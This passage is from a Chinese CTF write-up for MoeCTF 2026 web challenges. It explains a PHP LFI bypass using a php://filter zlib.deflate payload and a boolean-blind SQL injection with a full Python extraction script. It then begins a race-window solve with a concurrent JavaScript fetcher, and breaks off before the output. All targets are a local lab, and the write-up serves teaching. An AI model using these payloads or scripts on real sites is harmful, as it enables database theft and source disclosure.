+<p>这就是典型的 <strong>LFI（本地文件包含）</strong>。PHP 里 <code>include()</code> 会把另一个文件的内容引入当前页面，当被包含的路径由用户控制、且没过滤时，攻击者就能让服务器包含并执行&#x2F;输出本地任意文件。直接访问 <code>?file=flag.php</code> 时，PHP 会把 flag.php <strong>执行</strong>掉、只输出它 <code>echo</code> 的内容——真正的 flag 藏在 flag.php 源码的 <code>$flag</code> 变量里，不 echo 所以看不到。要读到 flag，得想办法拿到 flag.php 的<strong>源码</strong>而不是执行它。</p>
+<p>读源码的经典手法是 <strong><code>php://filter</code> 伪协议</strong>：<code>php://</code> 是 PHP 的输入输出流封装协议族，其中 <code>php://filter</code> 能在读文件时先经过一系列过滤器处理再输出，格式 <code>php://filter/&lt;过滤器&gt;/resource=&lt;文件&gt;</code>。最常用的是 <code>php://filter/convert.base64-encode/resource=flag.php</code>——把 flag.php 的<strong>源码</strong>用 base64 编码后输出，因为 base64 后是文本、不会被执行，所以能绕过「include 会执行 PHP」的问题直接读到源码。</p>
+<p>但本题黑名单 ban 了 <code>convert</code>、<code>string</code>、<code>data</code> 等关键字，<code>convert.base64-encode</code> 用不了。不过注意源码里还有一段巧妙的兜底逻辑：输出前用 <code>preg_match(&#39;//u&#39;, $output)</code> 判断是不是合法 UTF-8（<code>/u</code> 修饰符表示按 UTF-8 解析，字符串不是合法 UTF-8 时返回 false），<strong>是二进制流就自动帮你 base64</strong>。这其实又用到了 base64 的另一层作用——<strong>把二进制数据文本化</strong>：把「非 UTF-8 的二进制」转成纯文本。</p>
+<p>所以思路变成：找一个没被 ban 的过滤器，让它产出「二进制」内容，逼程序自动 base64。黑名单里没 ban <code>zlib.deflate</code>，它对应 <strong>raw deflate 压缩</strong>（<code>zlib</code> 是通用压缩库，deflate 去掉了 zlib 头、只有 DEFLATE 数据），能把文件内容压缩成二进制流：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/zlib.deflate/resource=flag.php</span><br></pre></td></tr></table></figure>
+
+<p>这个过滤器把 flag.php 源码压缩成二进制，恰好触发「非 UTF-8 自动 base64」，返回一段 base64：</p>
+<p><img src="/img/qg_3_flag.png" alt="filter 返回 base64"></p>
+<p>把返回的 base64 解压（PHP 的 <code>zlib.deflate</code> 是 raw deflate，Python 里要加 <code>-zlib.MAX_WBITS</code>）：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64, zlib</span><br><span class="line">raw = base64.b64decode(<span class="string">&quot;lZBBTsJA...&quot;</span>)   <span class="comment"># 页面返回的 base64</span></span><br><span class="line"><span class="built_in">print</span>(zlib.decompress(raw, -zlib.MAX_WBITS).decode())</span><br></pre></td></tr></table></figure>
+
+<p>还原出 flag.php 源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&quot;moectf&#123;62ff56a8-03cf-0618-4129-33a3f9e36c46&#125;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Flag 就在上面，只有聪明的人才能看见...&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>Flag:</strong> <code>moectf{62ff56a8-03cf-0618-4129-33a3f9e36c46}</code></p>
+<p>这题的启发是：即使 <code>convert.base64-encode</code> 被 ban，只要能让输出变成「非 UTF-8 的二进制」，仍可能触发程序里「自动 base64」的兜底逻辑。</p>
+<hr>
+<h2 id="4-江洋大盗（200-分）"><a href="#4-江洋大盗（200-分）" class="headerlink" title="4. 江洋大盗（200 分）"></a>4. 江洋大盗（200 分）</h2><blockquote>
+<p>MoeCTF 2026 · Web 安全与渗透测试 · 200 分<br>题目：江洋大盗（「学院经历了上次事件，对数据库进行了全面升级，现在你还能拿到往年试题吗？」）</p>
+</blockquote>
+<p>打开是「网信院往年试题检索系统」，只有一个序号查询框，输入序号（1~5）返回公开科目的登记人信息：</p>
+<table>
+<thead>
+<tr>
+<th>序号</th>
+<th>登记人</th>
+<th>公开科目</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td>林舟</td>
+<td>高等数学</td>
+</tr>
+<tr>
+<td>2</td>
+<td>周棠</td>
+<td>大学英语</td>
+</tr>
+<tr>
+<td>3</td>
+<td>许青</td>
+<td>计算机导论</td>
+</tr>
+<tr>
+<td>4</td>
+<td>陆遥</td>
+<td>线性代数</td>
+</tr>
+<tr>
+<td>5</td>
+<td>沈知</td>
+<td>网络安全基础</td>
+</tr>
+</tbody></table>
+<p><img src="/img/jydd_1_home.png" alt="题目页面"></p>
+<p>提交表单 <code>POST /</code>、参数 <code>id</code>，直接拼接进 SQL，和上篇「河湖小盗」一样是<strong>数字型注入</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id=1 and 1=1   → 返回记录（真）</span><br><span class="line">id=1 and 1=2   → &quot;没有找到匹配记录&quot;（假）</span><br><span class="line">id=1 or 1=1    → 返回全部 5 条</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/jydd_2_inject.png" alt="注入点：and 1&#x3D;2 返回无记录"></p>
+<p>用 <code>ORDER BY</code> 探测列数——<code>ORDER BY n</code> 表示按结果第 n 列排序，<code>n</code> 超过实际列数时报错。<code>order by 3</code> 正常、<code>order by 4</code> 报错，说明共 3 列。</p>
+<p>但接下来尝试 <code>union select</code> 全部失败（大小写、双写、<code>/**/</code>、<code>/*!*/</code>、<code>%0a</code>、<code>union all</code> 均被拦截）。这是典型的<strong>黑名单防护</strong>——把已知危险关键字（<code>union</code> 等）列入禁止名单、命中就拦截。它的问题是「永远补不全」，常见绕过有大小写、双写（<code>ununionion</code> 删中间后又拼回）、注释&#x2F;空白变形、换等价写法等。本题这些绕 <code>union</code> 的招都不灵，但<strong>子查询 <code>(select ...)</code> 可以正常执行</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=1 and (select 1)=1   → 真</span><br><span class="line">id=1 and (select 2)=1   → 假</span><br></pre></td></tr></table></figure>
+
+<p><strong>子查询</strong>是嵌套在 SQL 里的 <code>(SELECT ...)</code>，先执行内层得到一个结果、外层再用它。既然 <code>union</code> 被禁、子查询能用，就把「想探测的内容」放进子查询、外面套一个恒真判断，把子查询结果「翻译」成真&#x2F;假。这条路通向<strong>布尔盲注</strong>。</p>
+<p>先理解什么是盲注：<strong>盲注指页面不会直接回显数据库内容的 SQL 注入</strong>。和 UNION 注入能把数据直接「显示出来」不同，盲注场景下只能得到「有差异的两种结果」——比如「有记录 vs 没有记录」——然后通过反复试探一点点把数据猜出来。本题判据：真 → 页面含「高等数学」，假 → 页面含「没有找到匹配记录」。</p>
+<p>先确认数据库类型：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=1 and (select count(*) from information_schema.tables)&gt;0   → 真</span><br><span class="line">id=1 and (select version()) is not null                        → 真</span><br></pre></td></tr></table></figure>
+
+<p>是 <strong>MySQL</strong>，于是可以继续用 <code>information_schema</code>（MySQL 内置元数据库，存着库&#x2F;表&#x2F;列结构信息）当导航地图。</p>
+<p>盲注要读出一个字符串，需要<strong>逐字符、逐位</strong>地猜，常用<strong>二分法</strong>：把目标字符看成 ASCII 码（0~127 的整数），每次判断 <code>ascii(substr(flag, 位置, 1)) &gt; 中间值</code> 的真假来折半缩小范围，把「猜一个字符」的代价从最多 127 次降到约 7 次（<code>log2(127)≈7</code>）。</p>
+<p>核心探测函数：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">blind</span>(<span class="params">e</span>):</span><br><span class="line">    <span class="keyword">return</span> check(<span class="string">&#x27;1 and (&#x27;</span> + e + <span class="string">&#x27;)&#x27;</span>)   <span class="comment"># check 发送 POST id=...</span></span><br></pre></td></tr></table></figure>
+
+<p>逐字符二分 ASCII 提取：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">extract</span>(<span class="params">sub</span>):</span><br><span class="line">    out = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">200</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> blind(<span class="string">f&#x27;length((<span class="subst">&#123;sub&#125;</span>))&gt;=<span class="subst">&#123;pos&#125;</span>&#x27;</span>):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        lo, hi = <span class="number">1</span>, <span class="number">127</span></span><br><span class="line">        <span class="keyword">while</span> lo &lt; hi:                     <span class="comment"># 二分 ASCII</span></span><br><span class="line">            mid = (lo + hi) // <span class="number">2</span></span><br><span class="line">            <span class="keyword">if</span> blind(<span class="string">f&#x27;ascii(substr((<span class="subst">&#123;sub&#125;</span>),<span class="subst">&#123;pos&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>&#x27;</span>):</span><br><span class="line">                lo = mid + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                hi = mid</span><br><span class="line">        out += <span class="built_in">chr</span>(lo)</span><br><span class="line">    <span class="keyword">return</span> out</span><br></pre></td></tr></table></figure>
+
+<p>依次枚举库 → 表 → 列：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">库名：database() = past_paper</span><br><span class="line"></span><br><span class="line">information_schema.tables 表名：</span><br><span class="line">  flag_table</span><br><span class="line">  past_paper</span><br><span class="line">  public_subject</span><br><span class="line"></span><br><span class="line">flag_table 列：id, flag</span><br></pre></td></tr></table></figure>
+
+<p>flag 就在 <code>flag_table.flag</code> 里，盲注提取 <code>(select flag from flag_table limit 0,1)</code>：</p>
+<p><img src="/img/jydd_3_flag.png" alt="盲注提取 flag"></p>
+<p><strong>Flag:</strong> <code>moectf{C0ngr@+u1@7|0ns_8u+_+h3re_wou1d_not_6e_any_pas7_3x@m_pap3r_in_f4ct}</code></p>
+<p>完整脚本 <code>E:/claude/blind_jiang.py</code>：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">URL = <span class="string">&#x27;http://127.0.0.1:8080/&#x27;</span></span><br><span class="line">TRUE_NEEDLE = <span class="string">&#x27;高等数学&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">idval</span>):</span><br><span class="line">    r = requests.post(URL, data=&#123;<span class="string">&#x27;id&#x27;</span>: idval&#125;, timeout=<span class="number">20</span>)</span><br><span class="line">    <span class="keyword">return</span> TRUE_NEEDLE <span class="keyword">in</span> r.text</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">blind</span>(<span class="params">cond</span>):</span><br><span class="line">    <span class="keyword">return</span> check(<span class="string">f&quot;1 and (<span class="subst">&#123;cond&#125;</span>)&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract</span>(<span class="params">sub, maxlen=<span class="number">200</span></span>):</span><br><span class="line">    out = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, maxlen+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> blind(<span class="string">f&quot;length((<span class="subst">&#123;sub&#125;</span>))&gt;=<span class="subst">&#123;pos&#125;</span>&quot;</span>):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        lo, hi = <span class="number">1</span>, <span class="number">127</span></span><br><span class="line">        <span class="keyword">while</span> lo &lt; hi:</span><br><span class="line">            mid = (lo+hi)//<span class="number">2</span></span><br><span class="line">            <span class="keyword">if</span> blind(<span class="string">f&quot;ascii(substr((<span class="subst">&#123;sub&#125;</span>),<span class="subst">&#123;pos&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>&quot;</span>):</span><br><span class="line">                lo = mid+<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                hi = mid</span><br><span class="line">        out += <span class="built_in">chr</span>(lo)</span><br><span class="line">    <span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(extract(<span class="string">&quot;select flag from flag_table limit 0,1&quot;</span>))</span><br></pre></td></tr></table></figure>
+
+<p>小结：数字型注入点，<code>union</code> 被黑名单拦截，改用 <code>(select ...)</code> 子查询做布尔盲注；通过 <code>information_schema</code> 依次枚举库名、表名、列名，最终在 <code>flag_table</code> 拿到 flag。盲注的本质是「构造一个返回真假的子查询」，二分 ASCII 逐字符还原。</p>
+<hr>
+<h2 id="5-我爱发明（200-分）"><a href="#5-我爱发明（200-分）" class="headerlink" title="5. 我爱发明（200 分）"></a>5. 我爱发明（200 分）</h2><blockquote>
+<p>MoeCTF 2026 · Web 安全与渗透测试 · 200 分<br>题目：我爱发明（「人工组与机械组的发明擂台，完成三轮擂台验收即可看到最终口令」）</p>
+</blockquote>
+<p>打开是一个「我爱发明」发明擂台网站，左侧三个关卡导航，右侧「机械组倒计时」面板：</p>
+<ol>
+<li><strong>火眼金睛挑零件</strong> —— 把三个零件编号抄进记录表</li>
+<li><strong>老师傅调样机</strong> —— 把仪表读数抄进调试记录</li>
+<li><strong>千台样机大验收</strong> —— 288 份档案，找「盖章通过的机械组验收片段」算最终口令</li>
+</ol>
+<p><img src="/img/wafm_1_home.png" alt="题目首页"></p>
+<p>前两关答案直接写在页面上，纯属送分过场：</p>
+<ul>
+<li>第一关零件编号：<code>B-17 S-09 T-04</code></li>
+<li>第二关调试记录：<code>860/73/III/2.4</code></li>
+</ul>
+<p>真正的考点在第三关：288 份档案、每页 12 份，机械组计时不会因翻页或刷新而重置——暗示这是一个有时间窗口的竞速题。</p>
+<p>先过前两关：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST -H <span class="string">&quot;Content-Type: application/json&quot;</span> \</span><br><span class="line">  -d <span class="string">&#x27;&#123;&quot;parts&quot;:&quot;B-17 S-09 T-04&quot;&#125;&#x27;</span> http://127.0.0.1:8080/api/stage1</span><br><span class="line"><span class="comment"># &#123;&quot;ok&quot;: true, &quot;message&quot;: &quot;人工组完成装配，机械组仍在倒计时。&quot;&#125;</span></span><br><span class="line"></span><br><span class="line">curl -X POST -H <span class="string">&quot;Content-Type: application/json&quot;</span> \</span><br><span class="line">  -d <span class="string">&#x27;&#123;&quot;tuning&quot;:&quot;860/73/III/2.4&quot;&#125;&#x27;</span> http://127.0.0.1:8080/api/stage2</span><br><span class="line"><span class="comment"># &#123;&quot;ok&quot;: true, &quot;message&quot;: &quot;人工组调试成功，可以进入最终验收。&quot;&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>访问第三关时，响应头里多了一个 cookie：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /stage/3</span><br><span class="line">...</span><br><span class="line">Set-Cookie: race=2ocEpEO-UhsXq2rJtOiNbaSn; Path=/; SameSite=Lax; Max-Age=20</span><br></pre></td></tr></table></figure>
+
+<p>这里要理解一下 <strong>Cookie 与会话机制</strong>。HTTP 本身是「无状态」的，服务器默认记不住上一个请求是谁发的；为了维持登录态、区分用户，就有了 Cookie&#x2F;会话：服务器通过响应头 <strong><code>Set-Cookie</code></strong> 让浏览器保存一小段数据，浏览器之后每次请求自动带回来（放在 <code>Cookie</code> 头），服务器据此识别用户。<code>Set-Cookie</code> 里常见属性：<strong><code>Max-Age</code>&#x2F;<code>Expires</code></strong> 是有效期（<code>Max-Age=20</code> 表示 20 秒后过期）、<code>Path</code> 作用路径、<code>HttpOnly</code> 禁止 JS 读、<code>SameSite</code> 限制跨站。</p>
+<p>这个 <code>race</code> cookie 就是「机械组验收」的竞速凭证，有效期只有 <strong>20 秒</strong>。不带它读档案库直接 403：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /archive?page=1   →  403  &quot;本轮验收尚未开始或已经结束，请回到第三关。&quot;</span><br></pre></td></tr></table></figure>
+
+<p>这题最容易踩的坑就在这里：很多工具（curl 默认、手写 fetch）不会自动持久化 cookie，导致一直卡在 403。</p>
+<p>带上 <code>race</code> cookie 读 <code>/invent/&lt;id&gt;</code>，每份档案详情页有这些字段：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;panel paper inspection-sheet&quot;</span> <span class="attr">data-team</span>=<span class="string">&quot;机械组&quot;</span> <span class="attr">data-status</span>=<span class="string">&quot;通过&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">th</span>&gt;</span>所属组别<span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span>机械组<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">th</span>&gt;</span>验收状态<span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">class</span>=<span class="string">&quot;verdict-ok&quot;</span>&gt;</span>通过<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">  ...</span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>验收片段：<span class="tag">&lt;<span class="name">code</span> <span class="attr">class</span>=<span class="string">&quot;inspection-code&quot;</span> <span class="attr">data-code</span>=<span class="string">&quot;KINLR5D7&quot;</span>&gt;</span>KINLR5D7<span class="tag">&lt;/<span class="name">code</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/wafm_2_race.png" alt="机械组「通过」档案的验收片段"></p>
+<p>三个关键点：</p>
+<ol>
+<li><code>data-team</code> —— 所属组别，按 <code>id % 3</code> 固定循环：<code>1→人工组、2→观众组、0→机械组</code>，所以机械组是 id 为 3 的倍数的 96 份。</li>
+<li><code>data-status</code> —— 验收状态，机械组里有 <code>通过</code>（盖章通过）和 <code>返工</code> 两种。</li>
+<li><code>data-code</code> —— <strong>只有「机械组 + 通过」的档案才有</strong> 8 位验收片段码，其余都是 <code>未盖章</code>。</li>
+</ol>
+<p>实测「通过」的机械组档案恰好是 <strong>id 为 6 的倍数</strong>（共 48 份），它们的 <code>data-code</code> 才是我们要的片段。</p>
+<p>规则是：把所有「盖章通过」的机械组片段按档案顺序用 <code>|</code> 连接，算 <strong>SHA-256</strong> 提交。SHA-256 是一种哈希函数，把任意长度输入映射成固定 256 位（64 个十六进制字符）的摘要，单向、抗碰撞，常用来做「口令校验」——服务端只存哈希、校验时把用户输入哈希后比对。这里「不直接提交原文、而是提交哈希」的设计，常见于防止没收集全片段就乱猜。</p>
+<p>完整脚本 <code>E:/claude/solve_1375.js</code>（注意 <code>finalize</code> 也要带 race cookie）：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">BASE</span> = <span class="string">&#x27;http://127.0.0.1:8080&#x27;</span>;</span><br><span class="line"><span class="keyword">let</span> raceCookie = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">extractCookie</span>(<span class="params">res</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> sc = res.<span class="property">headers</span>.<span class="title function_">get</span>(<span class="string">&#x27;set-cookie&#x27;</span>);</span><br><span class="line">  <span class="keyword">if</span> (sc) &#123; <span class="keyword">const</span> m = sc.<span class="title function_">match</span>(<span class="regexp">/race=([^;]+)/</span>); <span class="keyword">if</span> (m) raceCookie = <span class="string">&#x27;race=&#x27;</span> + m[<span class="number">1</span>]; &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">post</span>(<span class="params">url, body</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> headers = &#123; <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span> &#125;;</span><br><span class="line">  <span class="keyword">if</span> (raceCookie) headers[<span class="string">&#x27;Cookie&#x27;</span>] = raceCookie;   <span class="comment">// finalize 也要带 cookie</span></span><br><span class="line">  <span class="keyword">const</span> res = <span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="variable constant_">BASE</span> + url, &#123; <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>, headers, <span class="attr">body</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(body) &#125;);</span><br><span class="line">  <span class="title function_">extractCookie</span>(res); <span class="keyword">return</span> res.<span class="title function_">text</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">get</span>(<span class="params">url</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> headers = raceCookie ? &#123; <span class="string">&#x27;Cookie&#x27;</span>: raceCookie &#125; : &#123;&#125;;</span><br><span class="line">  <span class="keyword">const</span> res = <span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="variable constant_">BASE</span> + url, &#123; headers &#125;);</span><br><span class="line">  <span class="title function_">extractCookie</span>(res); <span class="keyword">return</span> res.<span class="title function_">text</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">await</span> <span class="title function_">post</span>(<span class="string">&#x27;/api/stage1&#x27;</span>, &#123; <span class="attr">parts</span>: <span class="string">&#x27;B-17 S-09 T-04&#x27;</span> &#125;);</span><br><span class="line">  <span class="keyword">await</span> <span class="title function_">post</span>(<span class="string">&#x27;/api/stage2&#x27;</span>, &#123; <span class="attr">tuning</span>: <span class="string">&#x27;860/73/III/2.4&#x27;</span> &#125;);</span><br><span class="line">  <span class="keyword">await</span> <span class="title function_">get</span>(<span class="string">&#x27;/stage/3&#x27;</span>);                       <span class="comment">// 拿到 race cookie，20 秒窗口开始</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> results = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">289</span>);</span><br><span class="line">  <span class="keyword">let</span> cursor = <span class="number">0</span>, <span class="variable constant_">CONC</span> = <span class="number">60</span>;</span><br><span class="line">  <span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">worker</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">      <span class="keyword">const</span> id = cursor++;                      <span class="comment">// id 从 1 到 288</span></span><br><span class="line">      <span class="keyword">if</span> (id &gt; <span class="number">288</span>) <span class="keyword">return</span>;</span><br><span class="line">      <span class="keyword">const</span> html = <span class="keyword">await</span> <span class="title function_">get</span>(<span class="string">&#x27;/invent/&#x27;</span> + id);</span><br><span class="line">      results[id] = &#123;</span><br><span class="line">        <span class="attr">team</span>:   (html.<span class="title function_">match</span>(<span class="regexp">/data-team=&quot;([^&quot;]*)&quot;/</span>)   || [])[<span class="number">1</span>],</span><br><span class="line">        <span class="attr">status</span>: (html.<span class="title function_">match</span>(<span class="regexp">/data-status=&quot;([^&quot;]*)&quot;/</span>) || [])[<span class="number">1</span>],</span><br><span class="line">        <span class="attr">code</span>:   (html.<span class="title function_">match</span>(<span class="regexp">/data-code=&quot;([^&quot;]*)&quot;/</span>)   || [])[<span class="number">1</span>],</span><br><span class="line">      &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">await</span> <span class="title class_">Promise</span>.<span class="title function_">all</span>(<span class="title class_">Array</span>.<span class="title function_">from</span>(&#123; <span class="attr">length</span>: <span class="variable constant_">CONC</span> &#125;, worker));   <span class="comment">// 并发读 288 份</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> codes = [];</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">1</span>; i &lt;= <span class="number">288</span>; i++)</span><br><span class="line">    <span class="keyword">if</span> (results[i].<span class="property">team</span> === <span class="string">&#x27;机械组&#x27;</span> &amp;&amp; results[i].<span class="property">status</span> === <span class="string">&#x27;通过&#x27;</span> &amp;&amp; results[i].<span class="property">code</span>)</span><br><span class="line">      codes.<span class="title function_">push</span>(results[i].<span class="property">code</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> sha = crypto.<span class="title function_">createHash</span>(<span class="string">&#x27;sha256&#x27;</span>).<span class="title function_">update</span>(codes.<span class="title function_">join</span>(<span class="string">&#x27;|&#x27;</span>)).<span class="title function_">digest</span>(<span class="string">&#x27;hex&#x27;</span>);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">await</span> <span class="title function_">post</span>(<span class="string">&#x27;/api/finalize&#x27;</span>, &#123; <span class="attr">answer</span>: sha &#125;));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">main</span>();</span><br></pre></td></tr></table></figure>
+
+<p>运行结果：</p>
